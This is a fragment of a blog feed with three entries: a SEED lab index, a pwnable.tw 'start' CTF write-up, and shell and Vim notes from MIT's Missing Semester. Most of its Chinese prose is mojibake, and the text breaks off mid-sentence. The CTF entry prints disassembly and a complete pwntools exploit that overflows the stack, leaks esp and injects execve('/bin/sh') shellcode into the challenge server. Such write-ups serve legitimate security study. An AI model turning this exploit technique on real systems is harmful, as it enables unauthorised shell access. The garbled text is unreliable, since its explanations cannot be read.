Security</h2><table><thead><tr><th>å®éªŒåç§°</th><th>GitHubé“¾æ¥</th><th>åšå®¢é“¾æ¥</th></tr></thead><tbody><tr><td>Heartbleed Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Heartbleed%20Attack%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/cd441a20/">åšå®¢é“¾æ¥</a></td></tr></tbody></table><h2 id="System-Security"><a href="#System-Security" class="headerlink" title="System Security"></a>System Security</h2><table><thead><tr><th>å®éªŒåç§°</th><th>GitHubé“¾æ¥</th><th>åšå®¢é“¾æ¥</th></tr></thead><tbody><tr><td>Meltdown Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Meltdown%20Attack%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/a6055774/">åšå®¢é“¾æ¥</a></td></tr><tr><td>Spectre Attack Lab</td><td><a href="https://github.com/LaPhilosophie/seedlab/tree/main/Spectre%20Attack%20Lab">GitHubé“¾æ¥</a></td><td><a href="https://gls.show/p/2724e696/">åšå®¢é“¾æ¥</a></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnable-twåˆ·é¢˜è®°å½•</title>
    <link href="/p/a735da4/"/>
    <url>/p/a735da4/</url>
    
    <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>æŠŠäºŒè¿›åˆ¶æ–‡ä»¶æ‹–è¿›32ä½idaçœ‹ä¸€ä¸‹ï¼Œå‘ç°åªæœ‰startå’Œexitä¸¤ä¸ªå‡½æ•°</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">08048060</span> _start          proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: LOAD:08048018â†‘o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048060</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">esp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048061</span>                 <span class="hljs-keyword">push</span>    offset _exit<br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048066</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048068</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ebx</span><br><span class="hljs-symbol">.text:</span>0804806A                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-symbol">.text:</span>0804806C                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span><br><span class="hljs-symbol">.text:</span>0804806E                 <span class="hljs-keyword">push</span>    <span class="hljs-number">3A465443h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048073</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-number">20656874h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048078</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-number">20747261h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804807D</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-number">74732073h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048082</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-number">2774654Ch</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048087</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">esp</span>        <span class="hljs-comment">; addr</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048089</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dl</span>, <span class="hljs-number">14h</span>         <span class="hljs-comment">; len</span><br><span class="hljs-symbol">.text:</span>0804808B                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">bl</span>, <span class="hljs-number">1</span>           <span class="hljs-comment">; fd</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804808D</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span>0804808F                 <span class="hljs-keyword">int</span>     <span class="hljs-number">80h</span>             <span class="hljs-comment">; LINUX - sys_write</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048091</span>                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">ebx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048093</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dl</span>, <span class="hljs-number">3Ch</span> <span class="hljs-comment">; &#x27;&lt;&#x27;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048095</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">3</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048097</span>                 <span class="hljs-keyword">int</span>     <span class="hljs-number">80h</span>             <span class="hljs-comment">; LINUX -</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">08048099</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">14h</span><br><span class="hljs-symbol">.text:</span>0804809C                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span> <span class="hljs-comment">; void exit(int status)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span> _exit           proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: _start+1â†‘o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span> status          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span>  <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0804809D</span>                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">esp</span><br><span class="hljs-symbol">.text:</span>0804809E                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>080480A0                 <span class="hljs-keyword">inc</span>     <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>080480A1                 <span class="hljs-keyword">int</span>     <span class="hljs-number">80h</span>             <span class="hljs-comment">; LINUX - sys_exit</span><br><span class="hljs-symbol">.text:</span>080480A1 _exit           endp <span class="hljs-comment">; sp-analysis failed</span><br></code></pre></td></tr></table></figure><p>ç®€å•åˆ†æä¸‹startçš„é€»è¾‘ï¼š</p><p>å…ˆè°ƒç”¨äº†writeå‡½æ•°ï¼Œæ‰“å°å­—ç¬¦ä¸²</p><ul><li>å°†old espå‹æ ˆ</li><li>å‹æ ˆäº”æ¬¡ï¼Œæ„å»ºè¦è¾“å‡ºçš„å­—ç¬¦ä¸²</li><li>å°†espçš„å€¼ä¼ ç»™ecxï¼Œecxæ˜¯æ‰“å°å¼€å§‹çš„åœ°å€</li><li>è®¾ç½®dlå’Œblã€alå¯„å­˜å™¨ï¼Œåˆ†åˆ«å¯¹åº”å­—ç¬¦ä¸²é•¿åº¦å’Œæ–‡ä»¶æè¿°ç¬¦çš„å€¼ã€ç³»ç»Ÿè°ƒç”¨å·ï¼ˆwriteç³»ç»Ÿè°ƒç”¨å¯¹åº”4ï¼‰</li><li>æ‰“å°å‡ºæ ˆä¸Šæ„å»ºçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå³æ˜¯æˆ‘ä»¬è¿è¡Œstartç¨‹åºåè¾“å‡ºçš„<code>Let&#39;s start the CTF:</code></li></ul><p>ä¹‹åè°ƒç”¨äº†readå‡½æ•°ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹å­˜åˆ°æ ˆä¸Š</p><p>æœ€åadd espï¼Œpop eipï¼Œè·³è½¬åˆ°exitå‡½æ•°ï¼Œç¨‹åºç»“æŸ</p><p>ç”±äºæˆ‘ä»¬å¯ä»¥æ§åˆ¶0x3cä¸ªç¼“å†²åŒºæ•°æ®ï¼Œè€Œè¿™ä¸ªé•¿åº¦å¤§äºespåˆ°ret addrçš„è·ç¦»ï¼Œå› æ­¤å­˜åœ¨æº¢å‡º</p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br><span class="hljs-comment">#sh=process(&#x27;./start&#x27;)</span><br>sh=remote(<span class="hljs-string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="hljs-number">10000</span>)<br>sh.recv() <span class="hljs-comment"># åæ‰ç¬¬ä¸€æ¬¡çš„è¾“å‡º</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x8048087</span>)<br><br>sh.send(payload) <span class="hljs-comment"># æ§åˆ¶eipå†æ¬¡æ‰§è¡Œwriteå‡½æ•°ï¼Œè¾“å‡ºold_esp</span><br>old_esp=u32(sh.recv()[:<span class="hljs-number">4</span>])<br><br><span class="hljs-comment">#ç»„ç»‡ç¬¬äºŒæ¬¡çš„payload</span><br>shellcode= <span class="hljs-string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span><br><br>ret_addr=old_esp+<span class="hljs-number">20</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(ret_addr)+shellcode<br><span class="hljs-comment">#gdb.attach(sh)</span><br><br>sh.send(payload)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure><p>å‡ ç‚¹è§£é‡Šï¼š</p><ul><li>ç”±äºæˆ‘ä»¬ä¸çŸ¥é“æ ˆçš„ä½ç½®ï¼Œå› æ­¤éœ€è¦å€ŸåŠ©writeç³»ç»Ÿè°ƒç”¨å°†old espçš„åœ°å€æ‰“å°å‡ºæ¥ï¼Œè¿™æ ·å°±å¯ä»¥å®šä½åˆ°shellcodeçš„åœ°å€</li><li>æˆ‘ä»¬éœ€è¦æ„é€ ä¸¤æ¬¡payloadï¼Œç¬¬ä¸€æ¬¡æ˜¯å¾—åˆ°old espï¼Œç¬¬äºŒæ¬¡æ˜¯åŠ«æŒæ§åˆ¶æµåˆ°shellcode</li><li>å¦‚æœä½¿ç”¨asm(shellcraft.sh())ï¼Œå°†ä¼šæ— æ³•get shellï¼Œå› ä¸ºé€šè¿‡è¿™ç§æ–¹å¼ç”Ÿæˆçš„shellcodeæ˜¯44å­—èŠ‚ï¼ŒåŠ ä¸Špaddingä¹‹åè¶…å‡ºäº†èƒ½æ§åˆ¶çš„0x3cçš„èŒƒå›´</li><li>å…³äºæ ˆå¸§çš„åˆ†æï¼Œå¯ä»¥å‚è€ƒ<a href="https://viblo.asia/p/pwnabletw-pwnstart-qPoL7zXXJvk">https://viblo.asia/p/pwnabletw-pwnstart-qPoL7zXXJvk</a></li><li>$ find / -name flagæŸ¥æ‰¾flag</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305171148027.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-missing-semesterè®¡ç®—æœºæ•™è‚²ä¸­ç¼ºå¤±çš„ä¸€è¯¾</title>
    <link href="/p/4c1dfd0d/"/>
    <url>/p/4c1dfd0d/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/missing-semester.png"></p><h1 id="Using-the-shell"><a href="#Using-the-shell" class="headerlink" title="Using the shell"></a>Using the shell</h1><p>è®¿é—®å¸¦æœ‰ç©ºæ ¼çš„æ–‡ä»¶å¤¹ï¼Œæ¯”å¦‚my photos</p><ul><li>ä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼šâ€my photosâ€</li><li>ä½¿ç”¨è½¬ä¹‰ï¼š- my\ photos</li></ul><p>shell æ‰§è¡Œ echo helloçš„è¿‡ç¨‹ï¼š</p><ul><li> shell åŸºäºç©ºæ ¼åˆ†å‰²å‘½ä»¤å¹¶è¿›è¡Œè§£æï¼Œç„¶åæ‰§è¡Œç¬¬ä¸€ä¸ªå•è¯ä»£è¡¨çš„ç¨‹åºï¼Œå¹¶å°†åç»­çš„å•è¯ä½œä¸ºç¨‹åºå¯ä»¥è®¿é—®çš„å‚æ•°</li><li>shellé¦–å…ˆåˆ¤æ–­å‘½ä»¤æ˜¯ä¸æ˜¯ç¼–ç¨‹å…³é”®å­—ï¼Œå¦‚æœä¸æ˜¯å°±ä»ç¯å¢ƒå˜é‡<code>$PATH</code>ä¸­å¯»æ‰¾ï¼Œå¯ä»¥é€šè¿‡<code>echo $PATH</code>å‘½ä»¤æŸ¥æ‰¾è·¯å¾„<ul><li> å¯ä»¥é€šè¿‡whichå‘½ä»¤æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶/é“¾æ¥æ‰€åœ¨çš„è·¯å¾„</li></ul></li></ul><p>è·¯å¾„ï¼š</p><ul><li>shell ä¸­çš„è·¯å¾„æ˜¯ä¸€ç»„è¢«åˆ†å‰²çš„ç›®å½•ï¼Œåœ¨ Linux å’Œ macOS ä¸Šä½¿ç”¨ / åˆ†å‰²ï¼Œè€Œåœ¨Windowsä¸Šæ˜¯ \</li><li>ç»å¯¹è·¯å¾„ä¸ç›¸å¯¹è·¯å¾„</li><li>lså¯ä»¥åˆ—å‡ºè·¯å¾„<ul><li>ls -alå‘½ä»¤çš„è¾“å‡ºç»“æœç¬¬ä¸€åˆ—æœ‰10ä¸ªå­—æ¯ï¼Œç¬¬ä¸€ä¸ªå­—æ¯è‹¥æ˜¯dè¡¨ç¤ºæ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹</li><li>è‹¥è¦è¿›å…¥æŸä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œéœ€è¦å¯æ‰§è¡Œæƒé™</li><li>è‹¥è¦åˆ—å‡ºå®ƒæ‰€åŒ…å«çš„å†…å®¹ï¼Œéœ€è¦å¯è¯»æƒé™</li></ul></li></ul><h1 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h1><ul><li><code>cat &lt; hello.txt &gt; hello2.txt</code>å°†hello.txtæ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°catå‘½ä»¤ï¼Œcatå°†è¾“å‡ºé‡å®šå‘åˆ°hello2.txtæ–‡ä»¶</li><li>ä½¿ç”¨ç®¡é“å¯ä»¥é‡å®šå‘ï¼Œæ¯”å¦‚<code>ls -l / | tail -n1</code>å°†ä¼šåˆ—å‡º<code>ls -l / </code>å‘½ä»¤æœ€åä¸€è¡Œçš„è¾“å‡º</li><li>ä¸€ä¸ªæŠ¥é”™åˆ†æ<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">sudo echo 3 &gt; brightness<br><span class="hljs-keyword">An</span> <span class="hljs-keyword">error</span> occurred <span class="hljs-keyword">while</span> redirecting <span class="hljs-keyword">file</span> &#x27;brightness&#x27;<br><span class="hljs-keyword">open</span>: Permission denied<br></code></pre></td></tr></table></figure><ul><li>shell (æƒé™ä¸ºæ‚¨çš„å½“å‰ç”¨æˆ·) åœ¨è®¾ç½® sudo echo å‰å°è¯•æ‰“å¼€ brightness æ–‡ä»¶å¹¶å†™å…¥ï¼Œä½†æ˜¯ç³»ç»Ÿæ‹’ç»äº† shell çš„æ“ä½œå› ä¸ºæ­¤æ—¶ shell ä¸æ˜¯æ ¹ç”¨æˆ·</li><li>ä¸€ä¸ªæ­£ç¡®çš„åšæ³•ï¼š<code>echo 3 | sudo tee brightness</code></li></ul></li></ul><h1 id="Shell-Scripting"><a href="#Shell-Scripting" class="headerlink" title="Shell Scripting"></a>Shell Scripting</h1><p>shellè„šæœ¬ä¸å…¶ä»–è„šæœ¬è¯­è¨€ä¸åŒä¹‹å¤„åœ¨äºï¼Œé’ˆå¯¹ shell æ‰€ä»äº‹çš„ç›¸å…³å·¥ä½œè¿›è¡Œæ¥ä¼˜åŒ–:</p><ul><li>åˆ›å»ºå‘½ä»¤æµç¨‹ï¼ˆpipelinesï¼‰</li><li>å°†ç»“æœä¿å­˜åˆ°æ–‡ä»¶</li><li>ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–è¾“å…¥</li></ul><p>ä»¥ä¸Šè¿™äº›éƒ½æ˜¯ shell è„šæœ¬ä¸­çš„åŸç”Ÿæ“ä½œï¼Œè¿™è®©å®ƒæ¯”é€šç”¨çš„è„šæœ¬è¯­è¨€æ›´æ˜“ç”¨</p><ul><li><code>#</code> åçš„å†…å®¹ä¼šè¢«æ³¨é‡Š</li><li>shellè„šæœ¬çš„ç¬¬ä¸€è¡Œå¦‚æœå‡ºç°äº†<code>#!/bin/bash</code>ï¼Œè¯´æ˜è¿™ä¸ªè„šæœ¬å°†ä¼šè¢«bashæ‰§è¡Œï¼Œè€Œä¸æ˜¯zshä¹‹ç±»çš„åˆ«çš„shell</li><li><code>chmod +x xxx.sh</code>èµ‹äºˆå¯æ‰§è¡Œæƒé™</li><li><code>./xxx.sh</code>ä¼šæ‰§è¡Œxxx.shè¿™ä¸ªè„šæœ¬ï¼Œä¸å¯ä»¥ç›´æ¥å†™ä¸Šxxx.shï¼Œå¦åˆ™ä¼šåœ¨PATHé‡Œé¢æ‰¾æœ‰æ²¡æœ‰äº¤xxx.shçš„</li><li>bashèµ‹å€¼è¯­æ³•ä¸º<code>foo=bar</code>ï¼Œè¡¨ç¤ºå°†barèµ‹å€¼ç»™fooï¼Œå‡è®¾å†™ä¸º<code>foo = bar</code>ï¼Œè¡¨ç¤ºå°†=å’Œbarå½“åšfooçš„ä¸¤ä¸ªå‚æ•°ï¼ˆåœ¨shellè„šæœ¬ä¸­ä½¿ç”¨ç©ºæ ¼ä¼šèµ·åˆ°åˆ†å‰²å‚æ•°çš„ä½œç”¨ï¼Œæœ‰æ—¶å€™å¯èƒ½ä¼šé€ æˆæ··æ·†ï¼‰</li><li>Bashä¸­çš„å­—ç¬¦ä¸²é€šè¿‡â€™ å’Œ â€œåˆ†éš”ç¬¦æ¥å®šä¹‰ï¼Œå‰è€…å®šä¹‰çš„å­—ç¬¦ä¸²ä¸ºåŸæ„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­çš„å˜é‡ä¸ä¼šè¢«è½¬ä¹‰ï¼Œè€Œåè€…å°†ä¼šå¯¹å˜é‡å€¼è¿›è¡Œæ›¿æ¢<ul><li>å•å¼•å·é‡Œçš„ä»»ä½•å­—ç¬¦éƒ½ä¼šåŸæ ·è¾“å‡ºï¼Œå•å¼•å·å­—ç¬¦ä¸²ä¸­çš„å˜é‡æ˜¯æ— æ•ˆçš„</li><li>åŒå¼•å·é‡Œå¯ä»¥æœ‰å˜é‡ä¸è½¬ä¹‰å­—ç¬¦</li></ul></li><li>å’Œå…¶ä»–å¤§å¤šæ•°çš„ç¼–ç¨‹è¯­è¨€ä¸€æ ·ï¼Œbashä¹Ÿæ”¯æŒif, case, while å’Œ for è¿™äº›æ§åˆ¶æµå…³é”®å­—ã€å‡½æ•°ï¼Œä¸€ä¸ªå‡½æ•°çš„ä¾‹å­ï¼š<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mcd</span> () &#123;<br>  <span class="hljs-attribute">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-comment"># $1è¡¨ç¤ºè„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°</span><br>  cd <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li>bashä½¿ç”¨è®¸å¤šç‰¹æ®Šçš„å˜é‡æ¥è¡¨ç¤ºå‚æ•°ã€é”™è¯¯ä»£ç å’Œç›¸å…³å˜é‡ï¼š<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$0</span> - è„šæœ¬å<br><span class="hljs-variable">$1</span> åˆ° <span class="hljs-variable">$9</span> - è„šæœ¬çš„å‚æ•°ã€‚ <span class="hljs-variable">$1</span> æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¾æ­¤ç±»æ¨ã€‚** æ³¨æ„ï¼Œ<span class="hljs-variable">$10</span> ä¸èƒ½è·å–ç¬¬åä¸ªå‚æ•°ï¼Œè·å–ç¬¬åä¸ªå‚æ•°éœ€è¦<span class="hljs-variable">$</span>&#123;<span class="hljs-number">10</span>&#125;ã€‚å½“n&gt;=<span class="hljs-number">10</span>æ—¶ï¼Œéœ€è¦ä½¿ç”¨<span class="hljs-variable">$</span>&#123;n&#125;æ¥è·å–å‚æ•°ã€‚ **<br><span class="hljs-variable">$</span><span class="hljs-selector-tag">@</span> - æ‰€æœ‰å‚æ•°<br><span class="hljs-variable">$</span><span class="hljs-comment"># - å‚æ•°ä¸ªæ•°</span><br><span class="hljs-variable">$</span>? - å‰ä¸€ä¸ªå‘½ä»¤çš„è¿”å›å€¼<br><span class="hljs-variable">$</span><span class="hljs-variable">$</span> - å½“å‰è„šæœ¬çš„è¿›ç¨‹è¯†åˆ«ç <br>!! - å®Œæ•´çš„ä¸Šä¸€æ¡å‘½ä»¤ï¼ŒåŒ…æ‹¬å‚æ•°ã€‚å¸¸è§åº”ç”¨ï¼šå½“ä½ å› ä¸ºæƒé™ä¸è¶³æ‰§è¡Œå‘½ä»¤å¤±è´¥æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ sudo !!å†å°è¯•ä¸€æ¬¡ã€‚<br><span class="hljs-variable">$_</span> - ä¸Šä¸€æ¡å‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°ã€‚å¦‚æœä½ æ­£åœ¨ä½¿ç”¨çš„æ˜¯äº¤äº’å¼ shellï¼Œä½ å¯ä»¥é€šè¿‡æŒ‰ä¸‹ Esc ä¹‹åé”®å…¥ . æ¥è·å–è¿™ä¸ªå€¼ã€‚<br></code></pre></td></tr></table></figure></li><li><code>&lt;(...)</code>è¢«ç§°ä¸ºç¨‹åºæ›¿æ¢ï¼ˆprogress substitutionï¼‰ï¼Œå®ƒå¯ä»¥å°†å‘½ä»¤è¾“å‡ºè½¬åŒ–ä¸ºdiffå‘½ä»¤å¯ä»¥è¯»å–çš„ç±»æ–‡ä»¶å¯¹è±¡ï¼Œå› æ­¤<code>diff &lt;(ls foo) &lt;(ls bar)</code> ä¼šæ˜¾ç¤ºæ–‡ä»¶å¤¹ foo å’Œ bar ä¸­æ–‡ä»¶çš„åŒºåˆ«</li><li>é€šé…ç¬¦*å’Œï¼Ÿ,åˆ†åˆ«è¡¨ç¤ºåŒ¹é…å•ä¸ªå’ŒåŒ¹é…æ‰€æœ‰ã€‚å¯¹äºæ–‡ä»¶foo, foo1, foo2, foo10 å’Œ bar, rm foo?è¿™æ¡å‘½ä»¤ä¼šåˆ é™¤foo1 å’Œ foo2 ï¼Œè€Œrm foo* åˆ™ä¼šåˆ é™¤é™¤äº†barä¹‹å¤–çš„æ‰€æœ‰æ–‡ä»¶ã€‚</li><li>å¯ä»¥ä½¿ç”¨ <a href="https://www.shellcheck.net/">https://www.shellcheck.net/</a> æ¥æ£€æµ‹shellè„šæœ¬çš„é”™è¯¯</li><li>å¯ä»¥ä½¿ç”¨ <a href="https://explainshell.com/">https://explainshell.com/</a>  æ¥åˆ†æshellè„šæœ¬çš„åŠŸèƒ½</li><li>èŠ±æ‹¬å·{} - å½“ä½ æœ‰ä¸€ç³»åˆ—çš„æŒ‡ä»¤ï¼Œå…¶ä¸­åŒ…å«ä¸€æ®µå…¬å…±å­ä¸²æ—¶ï¼Œå¯ä»¥ç”¨èŠ±æ‹¬å·æ¥è‡ªåŠ¨å±•å¼€è¿™äº›å‘½ä»¤<ul><li><code>cp /path/to/project/&#123;foo,bar,baz&#125;.sh /newpath </code>ä¼šå±•å¼€ä¸º<code>cp /path/to/project/foo.sh /path/to/project/bar.sh /path/to/project/baz.sh /newpath</code></li><li><code>mv *&#123;.py,.sh&#125; folder</code>ä¼šç§»åŠ¨æ‰€æœ‰ *.py å’Œ *.sh æ–‡ä»¶</li><li>ä¸‹é¢å‘½ä»¤ä¼šåˆ›å»º<code>foo/a, foo/b, ... foo/h, bar/a, bar/b, ... bar/h</code>è¿™äº›æ–‡ä»¶ï¼š<code>touch &#123;foo,bar&#125;/&#123;a..h&#125;</code></li></ul></li><li>æŸ¥æ‰¾æ–‡ä»¶ï¼š<code>find</code>å‘½ä»¤ã€<code>fd</code>ï¼ˆgithubä¸Šå¯¹äºfindå‘½ä»¤çš„æ›¿ä»£çš„å¼€æºé¡¹ç›®ï¼‰ã€locateå‘½ä»¤</li></ul><h1 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h1><p>Vimçš„å“²å­¦ï¼š</p><ul><li>Vimå¯ç¼–ç¨‹ï¼ˆå¯ä»¥ä½¿ç”¨ Vimscript æˆ–è€…åƒ Python ä¸€æ ·çš„å…¶ä»–ç¨‹åºè¯­è¨€ï¼‰ï¼‰</li><li>Vim çš„æ¥å£æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªç¨‹åºè¯­è¨€</li><li>Vim é¿å…äº†ä½¿ç”¨é¼ æ ‡ï¼Œå‡å°‘äº†æ‰‹æŒ‡ç§»åŠ¨</li><li> Vim æ˜¯ä¸€ä¸ªèƒ½è·Ÿä¸Šä½ æ€ç»´é€Ÿåº¦çš„ç¼–è¾‘å™¨</li></ul><p>Vimçš„å‡ ä¸ªæ¨¡å¼ï¼š</p><ul><li>æ­£å¸¸ï¼ˆnormalï¼‰æ¨¡å¼ï¼šåœ¨æ–‡ä»¶ä¸­å››å¤„ç§»åŠ¨å…‰æ ‡è¿›è¡Œä¿®æ”¹ï¼ˆå¯åŠ¨åçš„é»˜è®¤æ¨¡å¼ï¼‰</li><li>æ’å…¥ï¼ˆinsertï¼‰æ¨¡å¼ï¼šæ’å…¥æ–‡æœ¬</li><li>æ›¿æ¢ï¼ˆreplaceï¼‰æ¨¡å¼ï¼šæ›¿æ¢æ–‡æœ¬</li><li>å¯è§†åŒ–ï¼ˆvisualï¼‰ï¼ˆä¸€èˆ¬ï¼Œè¡Œï¼Œå—ï¼‰æ¨¡å¼ï¼šé€‰ä¸­æ–‡æœ¬å—</li><li>å‘½ä»¤ï¼ˆcommandï¼‰æ¨¡å¼ï¼šç”¨äºæ‰§è¡Œå‘½ä»¤</li><li>Vimä¼šåœ¨å·¦ä¸‹è§’æ˜¾ç¤ºå½“å‰çš„æ¨¡å¼</li></ul><blockquote><p>åœ¨ä¸åŒçš„æ“ä½œæ¨¡å¼ä¸‹ï¼Œé”®ç›˜æ•²å‡»çš„å«ä¹‰ä¹Ÿä¸åŒã€‚æ¯”å¦‚ï¼Œx åœ¨æ’å…¥æ¨¡å¼ä¼šæ’å…¥å­—æ¯xï¼Œä½†æ˜¯åœ¨æ­£å¸¸æ¨¡å¼ ä¼šåˆ é™¤å½“å‰å…‰æ 